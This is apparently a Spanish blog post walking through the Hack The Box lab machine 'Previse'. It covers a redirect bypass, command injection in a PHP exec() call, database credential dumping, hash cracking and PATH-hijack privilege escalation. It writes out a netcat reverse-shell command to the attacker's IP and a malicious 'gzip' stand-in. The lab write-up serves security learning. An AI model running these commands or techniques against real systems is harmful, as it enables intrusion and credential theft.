<!DOCTYPE html><html lang="es" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="días antes"><meta name="hour-prompt" content="horas antes"><meta name="minute-prompt" content="minutos antes"><meta name="justnow-prompt" content="justo ahora"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Previse (Hack The Box)" /><meta name="author" content="J0lm3d0" /><meta property="og:locale" content="es" /><meta name="description" content="En este documento se recogen los pasos a seguir para la resolución de la máquina Previse de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil de resolución según la plataforma." /><meta property="og:description" content="En este documento se recogen los pasos a seguir para la resolución de la máquina Previse de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil de resolución según la plataforma." /><link rel="canonical" href="https://j0lm3d0.github.io/posts/previse-(hack-the-box)/" /><meta property="og:url" content="https://j0lm3d0.github.io/posts/previse-(hack-the-box)/" /><meta property="og:site_name" content="J0lm3d0" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-01-08T20:00:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Previse (Hack The Box)" /><meta name="twitter:site" content="@J0lm3d0" /><meta name="twitter:creator" content="@J0lm3d0" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"J0lm3d0"},"dateModified":"2022-03-15T19:57:03+01:00","datePublished":"2022-01-08T20:00:00+01:00","description":"En este documento se recogen los pasos a seguir para la resolución de la máquina Previse de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil de resolución según la plataforma.","headline":"Previse (Hack The Box)","mainEntityOfPage":{"@type":"WebPage","@id":"https://j0lm3d0.github.io/posts/previse-(hack-the-box)/"},"url":"https://j0lm3d0.github.io/posts/previse-(hack-the-box)/"}</script><title>Previse (Hack The Box) | J0lm3d0</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="J0lm3d0"><meta name="application-name" content="J0lm3d0"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="es"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://cdna.artstation.com/p/assets/images/images/022/342/774/large/nikita-poghainyi-viber-2019-08-04-15-41-05.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">J0lm3d0</a></div><div class="site-subtitle font-italic">CTF Writeups</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>INICIO</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORÍAS</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>ETIQUETAS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>HISTÓRICO</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ACERCA DE</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/J0lm3d0" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/J0lm3d0" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a> <a href="https://www.linkedin.com/in/j0lm3d0/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Inicio </a> </span> <span>Previse (Hack The Box)</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Entrada</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Buscar..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancelar</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Previse (Hack The Box)</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> J0lm3d0 </span> - <span class="timeago " data-toggle="tooltip" data-placement="bottom" title=" 8 Jan 2022, 20:00" > 8 Jan<i class="unloaded">2022-01-08T20:00:00+01:00</i> </span></div><div> <span> Actualizado <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="15 Mar 2022, 19:57" >15 Mar<i class="unloaded">2022-03-15T19:57:03+01:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1784 palabras">9 minutos de lectura</span></div></div><div class="post-content"><p>En este documento se recogen los pasos a seguir para la resolución de la máquina Previse de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil de resolución según la plataforma.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/Previse/machine.png" alt="Logo de la máquina" /></p><p><a href="/pdfs/Write_up_Previse.pdf">Write-up en PDF realizado mediante LaTeX</a></p><h2 id="enumeración-de-servicios-y-recopilación-de-información-sensible">Enumeración de servicios y recopilación de información sensible</h2><p>Para comenzar, realizo un escaneo de todo el rango de puertos TCP mediante la herramienta <code class="language-plaintext highlighter-rouge">Nmap</code>.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre># nmap -p- --open -T5 -n -vv 10.10.11.104

Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
</pre></table></code></div></div><p>Tras obtener los puertos que la máquina tiene abiertos, aplico scripts básicos de enumeración y utilizo la flag -sV para intentar conocer la versión y servicio que están ejecutando cada uno de esos puertos.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre># nmap -p 22,80 -sC -sV 10.10.11.104

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><p>Al encontrarse abiertos los puertos 22 y 80, y no contar con ningunas credenciales para el servicio SSH, comienzo a enumerar el servidor web. Al acceder a la página principal, me redirige a la ruta “/login.php”, en la cual vemos un panel de login:</p><p><img data-proofer-ignore data-src="/assets/img/HTB/Previse/loginpage.png" alt="Panel login del servidor web" /></p><p>Reviso el código fuente de la página, por si hubiesen dejado algunas credenciales en algún comentario, pero no hay nada. Por tanto, procedo a buscar directorios y/o archivos mediante la herramienta <code class="language-plaintext highlighter-rouge">Gobuster</code>. Tras la búsqueda, se ven varias rutas que hacen una redirección a “login.php”, por lo que parece que hay que conseguir acceso para ver esas rutas.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre># gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 80 -x php,txt,html -u http://10.10.11.104

/download.php         (Status: 302) [Size: 0] [--&gt; login.php]
/header.php           (Status: 200) [Size: 980]              
/nav.php              (Status: 200) [Size: 1248]             
/footer.php           (Status: 200) [Size: 217]              
/login.php            (Status: 200) [Size: 2224]             
/css                  (Status: 301) [Size: 310] [--&gt; http://10.10.11.104/css/]
/files.php            (Status: 302) [Size: 4914] [--&gt; login.php]              
/index.php            (Status: 302) [Size: 2801] [--&gt; login.php]              
/status.php           (Status: 302) [Size: 2968] [--&gt; login.php]              
/js                   (Status: 301) [Size: 309] [--&gt; http://10.10.11.104/js/]
/logout.php           (Status: 302) [Size: 0] [--&gt; login.php]                 
/accounts.php         (Status: 302) [Size: 3994] [--&gt; login.php]              
/config.php           (Status: 200) [Size: 0]                                 
/logs.php             (Status: 302) [Size: 0] [--&gt; login.php]                 
/server-status        (Status: 403) [Size: 277]
</pre></table></code></div></div><p>Pero, tras revisar de nuevo el resultado, me sorprende que algunas de estas rutas en las que devuelve un código 302 y se hace una redirección a “login.php”, tienen un tamaño mayor que 0, lo que podría significar que, antes de hacer la redirección, cargue el contenido de la página. Por tanto, pruebo a capturar una petición a una de esas rutas mediante <code class="language-plaintext highlighter-rouge">BurpSuite</code>. Realizo una petición a “files.php” y, efectivamente, veo que la página me responde con un código 302, pero me muestra el código fuente de la página.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/Previse/filescode_burp.png" alt="Código de la página &quot;files&quot; del servidor web" /></p><p>Además, para las respuestas, <em>BurpSuite</em> cuenta con la opción “Render”, que interpreta el código y permite visualizar la web como si se hiciese desde un navegador.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/Previse/filespage_burp.png" alt="Página &quot;files&quot; del servidor web" /></p><p>De esta forma, compruebo el contenido de las diferentes rutas y detecto que la ruta “accounts.php” contiene un formulario que permite registrar una cuenta en la plataforma.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/Previse/accountspage.png" alt="Página &quot;accounts&quot; del servidor web" /></p><p>Para acceder a este formulario burlando la redirección se puede sustituir el código “302 Found” por un “200 OK” al interceptar la respuesta del servidor mediante <em>BurpSuite</em> y enviar el paquete una vez modificado. De esta forma, la página carga directamente en mi navegador y puedo completar el formulario, registrando así un nuevo usuario.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/Previse/accountsburp.png" alt="Respuesta del servidor web al acceder a la ruta &quot;accounts&quot;" /></p><h2 id="acceso-a-la-máquina">Acceso a la máquina</h2><p>Tras registrar una cuenta y conseguir acceso a la plataforma, accedo a la ruta “files.php” y descargo el archivo siteBackup.zip que había visto previamente. Al descomprimirlo, veo que se trata de una copia de los archivos que componen el servidor web.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre># ls -l

.rw-r--r-- j0lm3d0 j0lm3d0  5.6 KB Sat Jun 12 07:04:45 2021  accounts.php
.rw-r--r-- j0lm3d0 j0lm3d0  208 B  Sat Jun 12 07:07:09 2021  config.php
.rw-r--r-- j0lm3d0 j0lm3d0  1.5 KB Wed Jun  9 08:57:57 2021  download.php
.rw-r--r-- j0lm3d0 j0lm3d0  1.2 KB Sat Jun 12 07:10:16 2021  file_logs.php
.rw-r--r-- j0lm3d0 j0lm3d0  6.0 KB Wed Jun  9 08:51:48 2021  files.php
.rw-r--r-- j0lm3d0 j0lm3d0  217 B  Thu Jun  3 06:00:53 2021  footer.php
.rw-r--r-- j0lm3d0 j0lm3d0 1012 B  Sat Jun  5 21:56:20 2021  header.php
.rw-r--r-- j0lm3d0 j0lm3d0  551 B  Sat Jun  5 22:00:14 2021  index.php
.rw-r--r-- j0lm3d0 j0lm3d0  2.9 KB Sat Jun 12 07:06:21 2021  login.php
.rw-r--r-- j0lm3d0 j0lm3d0  190 B  Tue Jun  8 12:42:56 2021  logout.php
.rw-r--r-- j0lm3d0 j0lm3d0  1.1 KB Wed Jun  9 08:58:41 2021  logs.php
.rw-r--r-- j0lm3d0 j0lm3d0  1.2 KB Sat Jun  5 15:31:05 2021  nav.php
.rw-r--r-- j0lm3d0 j0lm3d0  1.9 KB Wed Jun  9 08:40:24 2021  status.php
</pre></table></code></div></div><p>De estos archivos, comienzo visualizando el “config.php”, ya que los archivos de configuración pueden contener credenciales en texto claro en el código y, en este caso, es así::</p><div lang="php" class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre># cat config.php

<span class="cp">&lt;?php</span>
<span class="k">function</span> <span class="n">connectDB</span><span class="p">(){</span>
    <span class="nv">$host</span> <span class="o">=</span> <span class="s1">'localhost'</span><span class="p">;</span>
    <span class="nv">$user</span> <span class="o">=</span> <span class="s1">'root'</span><span class="p">;</span>
    <span class="nv">$passwd</span> <span class="o">=</span> <span class="s1">'mySQL_p@ssw0rd!:)'</span><span class="p">;</span>
    <span class="nv">$db</span> <span class="o">=</span> <span class="s1">'previse'</span><span class="p">;</span>
    <span class="nv">$mycon</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">mysqli</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span> <span class="nv">$user</span><span class="p">,</span> <span class="nv">$passwd</span><span class="p">,</span> <span class="nv">$db</span><span class="p">);</span>
    <span class="k">return</span> <span class="nv">$mycon</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>Pero con estas credenciales no puedo acceder a nada, ya que el servicio de base de datos no está expuesto de forma externa, solo es accesible desde el propio servidor. Dándole otra vuelta a los archivos descargados, veo que el fichero “logs.php”, es el encargado de sacar un log con los archivos que ha descargado cada usuario.</p><div lang="php" class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre>
# cat logs.php

<span class="cp">&lt;?php</span>
<span class="nb">session_start</span><span class="p">();</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'user'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: login.php'</span><span class="p">);</span>
    <span class="k">exit</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>

<span class="cp">&lt;?php</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_METHOD'</span><span class="p">]</span> <span class="o">==</span> <span class="s1">'POST'</span><span class="p">)</span> <span class="p">{</span>
    <span class="nb">header</span><span class="p">(</span><span class="s1">'Location: login.php'</span><span class="p">);</span>
    <span class="k">exit</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">/////////////////////////////////////////////////////////////////////////////////////</span>
<span class="c1">//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//</span>
<span class="c1">/////////////////////////////////////////////////////////////////////////////////////</span>

<span class="nv">$output</span> <span class="o">=</span> <span class="nb">exec</span><span class="p">(</span><span class="s2">"/usr/bin/python /opt/scripts/log_process.py </span><span class="si">{</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'delim'</span><span class="p">]</span><span class="si">}</span><span class="s2">"</span><span class="p">);</span>
<span class="k">echo</span> <span class="nv">$output</span><span class="p">;</span>
</pre></table></code></div></div><p>Para obtener el log, utiliza la función <em>exec()</em> para ejecutar un script de Python, pasándole como argumento el parámetro “delim” capturado en la petición POST originada en la página “file_logs.php”.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/Previse/filelogspage.png" alt="Página &quot;file_logs&quot; del servidor web" /></p><p>Al clicar en el botón de “Submit”, veremos la siguiente petición a “logs.php”, donde vemos la variable “delim” con el valor indicado previamente desde el navegador web..</p><p><img data-proofer-ignore data-src="/assets/img/HTB/Previse/filelogsrequest.png" alt="Petición a &quot;logs.php&quot;" /></p><p>Al ser sustituido el valor de “delim” por un parámetro en la función <em>exec()</em> de PHP, que realiza una ejecución a nivel de sistema, podemos concatenar un comando para ver si se ejecuta.. En este caso, pruebo a lanzar una shell a mi máquina de atacante mediante <code class="language-plaintext highlighter-rouge">NetCat</code>.</p><p><img data-proofer-ignore data-src="/assets/img/HTB/Previse/filelogsmodrequest.png" alt="Petición modificada a &quot;logs.php&quot;" /></p><p><img data-proofer-ignore data-src="/assets/img/HTB/Previse/access.png" alt="Accedo a la máquina como &quot;www-data&quot;" /></p><p>Tras acceder, consulto la base de datos “previse” utilizando las credenciales que había obtenido anteriormente. En ella, encuentro 2 tablas: “accounts” y “files”. En la tabla “accounts” encuentro las contraseñas hasheadas de mi usuario y de “m4lwhere”, siendo este último un usuario del sistema operativo también.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>www-data@previse:/var/www/html$ mysql -u root -pmySQL_p@ssw0rd\!:\) -D previse -e "SHOW TABLES;"

+-------------------+
| Tables_in_previse |
+-------------------+
| accounts          |
| files             |
+-------------------+
www-data@previse:/var/www/html$ mysql -u root -pmySQL_p@ssw0rd\!:\) -D previse -e "SELECT * FROM accounts"
mysql: [Warning] Using a password on the command line interface can be insecure.
+----+----------+------------------------------------+---------------------+
| id | username | password                           | created_at          |
+----+----------+------------------------------------+---------------------+
|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | j0lm3d0  | $1$🧂llol$9V3HE09GdFQiHRXIQrRgQ0 | 2021-10-12 14:18:14 |
+----+----------+------------------------------------+---------------------+
</pre></table></code></div></div><p>Gracias a <code class="language-plaintext highlighter-rouge">HashCat</code>, logro crackear el hash MD5, obteniendo así la contraseña en texto claro.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre># hashcat -a 0 -m 500 hash rockyou.txt

$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!

Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
Hash.Target......: $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.
Time.Started.....: Tue Oct 12 11:12:19 2021 (8 mins, 16 secs)
Time.Estimated...: Tue Oct 12 11:20:35 2021 (0 secs)
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    15212 H/s (7.56ms) @ Accel:32 Loops:1000 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 7413376/14344385 (51.68%)
Rejected.........: 0/7413376 (0.00%)
Restore.Point....: 7413248/14344385 (51.68%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1000
Candidates.#1....: ilovecody98 -&gt; ilovecloandlivey
</pre></table></code></div></div><p>Pruebo a acceder mediante el servicio SSH como el usuario “m4lwhere”, proporcionando la contraseña recién obtenida, y consigo acceder y visualizar la primera flag.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>m4lwhere@previse:~$ cat user.txt

17965ba0b03270cb341178f081b0202e
</pre></table></code></div></div><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><p>Durante la enumeración del sistema para la escalada de privilegios, compruebo mediante el comando “sudo -l” si puede ejecutarse algún archivo con privilegios de otro usuario o sin proporcionar contraseña. En este caso, se puede ejecutar “access_backup.sh” con privilegios de root.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>m4lwhere@previse:~$ sudo -l

User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
</pre></table></code></div></div><p>Tras revisar el script, veo que utiliza comandos sin emplear la ruta absoluta, por lo que este script sería vulnerable a un <a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/">Path Hijacking</a>.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh

#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log &gt; /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log &gt; /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
</pre></table></code></div></div><p>Para explotar la vulnerabilidad, creo un archivo con nombre “gzip” en la ruta “/tmp”, cuya función será la de lanzar una bash, y agrego esta ruta al principio de la variable PATH.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>m4lwhere@previse:~$ cat /tmp/gzip

/bin/bash -i -p

m4lwhere@previse:~$ export PATH=/tmp:$PATH
</pre></table></code></div></div><p>Con esto, una vez ejecute el script utilizando “sudo”, obtendré una shell como root. Pero, como se ve en la siguiente imagen, no consigo ver la salida de los comandos que ejecuto, por lo que decido enviarme una shell a mi máquina de atacante y, de esta forma, ya veo la salida de los comandos y puedo visualizar la flag final.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>m4lwhere@previse:~$ sudo /opt/scripts/access_backup.sh
root@previse:~# whoami
root@previse:~# nc -e /bin/bash 10.10.14.122 443



# nc -lvnp 443

listening on [any] 443 ...
connect to [10.10.14.122] from (UNKNOWN) [10.10.11.104] 36562
id

uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt

dc8bf89e4c22b9e1419461b1f62228b6

</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/web-app-unprotected/" class="post-tag no-text-decoration" >web_app_unprotected</a> <a href="/tags/path-hijacking/" class="post-tag no-text-decoration" >path_hijacking</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Compartir</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Previse (Hack The Box) - J0lm3d0&url=https://j0lm3d0.github.io/posts/previse-(hack-the-box)/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Previse (Hack The Box) - J0lm3d0&u=https://j0lm3d0.github.io/posts/previse-(hack-the-box)/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Previse (Hack The Box) - J0lm3d0&url=https://j0lm3d0.github.io/posts/previse-(hack-the-box)/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', '¡Enlace copiado correctamente!')" data-toggle="tooltip" data-placement="top" title="Copiar enlace"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Actualizado recientemente</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/tier-0-starting-point-machines-(hack-the-box)/">Tier 0 Starting Point Machines (Hack The Box)</a><li><a href="/posts/previse-(hack-the-box)/">Previse (Hack The Box)</a><li><a href="/posts/couch-(try-hack-me)/">Couch (Try Hack Me)</a><li><a href="/posts/knife-(hack-the-box)/">Knife (Hack The Box)</a><li><a href="/posts/pentesting_shells_cheat_sheet_script/">Pentesting_Shells-Cheat_Sheet-Script</a></ul></div><div id="access-tags"> <span>Etiquetas en tendencia</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/sudo/">sudo</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/adb/">adb</a> <a class="post-tag" href="/tags/alwaysinstallelevated-privilege/">alwaysinstallelevated_privilege</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/android-debugger-bridge/">android_debugger_bridge</a> <a class="post-tag" href="/tags/capabilities/">capabilities</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contenidos</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Más entradas</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/couch-(try-hack-me)/"><div class="card-body"> <span class="timeago small" >12 Nov 2021<i class="unloaded">2021-11-12T11:00:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Couch (Try Hack Me)</h3><div class="text-muted small"><p> En este documento se recogen los pasos a seguir para la resolución de la máquina Couch de la plataforma TryHackMe. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil de resolu...</p></div></div></a></div><div class="card"> <a href="/posts/boilerctf-(try-hack-me)/"><div class="card-body"> <span class="timeago small" >25 Nov 2021<i class="unloaded">2021-11-25T19:00:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Boiler CTF (Try Hack Me)</h3><div 